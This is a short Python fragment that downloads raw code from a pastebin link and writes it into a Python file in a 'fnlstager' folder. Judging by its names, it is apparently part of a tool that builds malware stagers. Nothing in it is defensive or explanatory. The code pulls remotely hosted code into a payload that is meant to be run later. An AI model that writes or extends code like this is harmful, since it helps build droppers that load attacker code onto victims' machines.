import requests
def rebuildstagerbase(flnm2):
    rr=requests.get('https://pastebin.com/raw/SeLDGE1A')
    datac=rr.text
    pc=open(f'fnlstager/{flnm2}.py','w')
    pc.close()
    with open(f"fnlstager/{flnm2}.py", 'w') as filewr:
        filewr.write(datac)